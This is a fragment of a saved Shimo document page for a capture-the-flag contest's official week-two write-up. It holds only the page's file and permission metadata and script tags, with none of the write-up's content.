官方WriteUp","name_pinyin":"n2wgfw|'newstarctf'2023'week2'guan'fang'writeup","password_protected":false,"share_mode":"readonly","type":"newdoc","is_delete":0,"user_id":28110366,"deleted_by":null,"updated_by":28110366,"team_id":null,"parent_id":5140742122,"created_at":"2023-08-31T09:40:11.000Z","updated_at":"2023-10-09T13:36:15.000Z","isFromSVC":false,"is_folder":0,"isFolder":false,"collaboratorCount":22,"departmentCollaboratorCount":0,"isSpace":false,"isLocked":false,"parentRole":"inherited","isShortcut":false,"isLegacy":true,"hasChildren":false,"isFileAdmin":false,"isCloudFile":false,"isDesktop":true,"fileSize":4957968,"user":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com","accountMetadata":{"isExpired":false,"isDingtalk":false,"isWework":false,"isEnterprise":false,"isFreeEnterprise":false,"expiredAt":{"seconds":1700807526,"nanos":0},"isTrial":false,"isPersonalPremium":true,"isEnterprisePremium":false,"isEnterpriseLight":false}},"updatedUser":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com"},"lockedUser":{},"Permissions":[{"id":null,"owner":false}],"permissionsAndReasons":{"canAddOutsider":{"value":false,"reason":"NOT_A_TEAM_FILE"},"canChangeShareMode":{"value":false,"reason":"UNKNOWN"},"canChangeTeamShareMode":{"value":false,"reason":"NOT_A_EDITOR"},"canComment":{"value":false,"reason":"UNKNOWN"},"canCopy":{"value":true,"reason":"UNKNOWN"},"canCreateChildFile":{"value":false,"reason":"UNKNOWN"},"canDownload":{"value":false,"reason":"NOT_A_DRIVE_FILE"},"canEdit":{"value":false,"reason":"UNKNOWN"},"canExit":{"value":false,"reason":"NOT_A_PERSONAL_COLLABORATOR"},"canExport":{"value":true,"reason":"UNKNOWN"},"canLock":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canManage":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canManageAdmin":{"value":false,"reason":"UNKNOWN"},"canManageCollaborator":{"value":false,"reason":"UNKNOWN"},"canRead":{"value":true,"reason":"UNKNOWN"},"canRemove":{"value":false,"reason":"CANT_MANAGE_FILE"},"canUnlock":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canUseMoveFeature":{"value":false,"reason":"CURRENT_ACCOUNT_VERSION_NOT_SUPPORT"},"canUsePasswordShareFileFeature":{"value":false,"reason":"CURRENT_ACCOUNT_VERSION_NOT_SUPPORT"},"canUseSheetLockFeature":{"value":false,"reason":"CURRENT_ACCOUNT_VERSION_NOT_SUPPORT"},"canDuplicate":{"value":true,"reason":"UNKNOWN"},"canUncompress":{"value":false,"reason":"NOT_A_COMPRESSED_FILE"},"canPrint":{"value":true,"reason":"UNKNOWN"},"canSaveAsTemplate":{"value":true,"reason":"UNKNOWN"},"canApplyPermission":{"value":true,"reason":"UNKNOWN"},"canRename":{"value":false,"reason":"UNKNOWN"},"canModifyAdvancedPermission":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canCustomizeAdvancedPermission":{"value":false,"reason":"NO_BASIC_PERMISSION"}},"sortName":["NewStarCTF ",2023," Week",2," ","guān","fāng","WriteUp"],"starred":false,"tags":[],"marked":false,"share_count":0,"isImportPending":false,"views":4143},
            user: {},
            watermarkStatus: false
          }
        </script>
        <script>window.__INITIAL_STATE__={"users":{"mirror":{},"diff":{},"data":{},"persist":[]},"files":{"mirror":{},"diff":{},"data":{"Dy5ekHJhKo0ap5v3":{"id":5134285819,"guid":"Dy5ekHJhKo0ap5v3","name":"NewStarCTF 2023 Week2 官方WriteUp","type":"newdoc","fileSize":4957968,"user":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com","accountMetadata":{"isWework":false,"isEnterprise":false,"isEnterpriseLight":false,"isTrial":false,"isEnterprisePremium":false,"isPersonalPremium":true,"isDingtalk":false,"isFreeEnterprise":false,"expiredAt":{"seconds":1700807526,"nanos":0},"isExpired":false}},"updatedUser":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com"},"teamId":null,"parentId":5140742122,"shareMode":"readonly","createdAt":"2023-08-31T09:40:11.000Z","updatedAt":"2023-10-09T13:36:15.000Z","passwordProtected":false,"sortName":["NewStarCTF ",2023," Week",2," ","guān","fāng","WriteUp"],"isSpace":false,"isFromSVC":false,"isNew":false,"starred":false,"watched":false,"mute":false,"requirePassword":false,"collaboratorCount":22,"views":4143,"marked":false,"hasDesktopShortcut":false,"permissions":{"readable":true,"editable":false,"commentable":false,"manageable":false,"exitable":false,"collaboratorManageable":false,"outsiderAddable":false,"childFileCreatable":false,"shareModeManageable":false,"moveable":false},"contentUrl":"","creator":{}}},"persist":["Dy5ekHJhKo0ap5v3"]},"tree":{"mirror":{},"data":{}},"me":{"id":0,"stale":false},"recent":null,"starred":null,"deleted":null,"status":{"online":true,"physicalOnline":true,"pendingRequests":0,"dataLoaded":true,"pushClientId":"c1c216ad-d672-44d4-bdbb-2de08cf7d012"},"notifications":{"all":null,"unread":null,"allHasMore":true,"unreadHasMore":true,"unpeekedCount":0,"unreadCount":0},"collaborators":{"mirror":{},"data":{}},"teams":{"mirror":{},"diff":{},"data":{},"persist":[]},"teamMembers":null,"recentContacts":null,"updated":{"list":[]},"shared":{"list":[]},"unreadShared":null,"created":{"list":[]},"used":{"list":[]},"shortcuts":[],"userGuide":{},"wechat":{},"maintenance":{},"flashMessages":{},"alphaFeatures":{},"subscriptions":{"app_push_comment":true,"app_push_invitation":true,"app_push_team":true,"app_push_mention":true,"not_send_apn_when_web_online":true,"comment":true,"app_push_system":true,"desktop":true},"syncedFiles":{},"discussions":{},"templates":{},"settings":{},"blueTips":{},"bulletin":{},"spaces":{"size":null},"page":{"guid":"Dy5ekHJhKo0ap5v3"},"ui":{"templateModal":{"visible":false}}}</script>
<script async="" src="./NewStarCTF 2023 Week2 官方WriteUp_files/component-5ee51777e7.js.下载"></script>
<script async="" src="./NewStarCTF 2023 Week2 官方WriteUp_files/doc-1e4e43a9ca.js.下载"></script>
    

<div><div id="ToastsContainer_ShimoUI"><div class="Toastify"></div></div></div><div class="ql-bookmarker-container"><button type="button" class="ql-bookmarker"></button></div></body></html>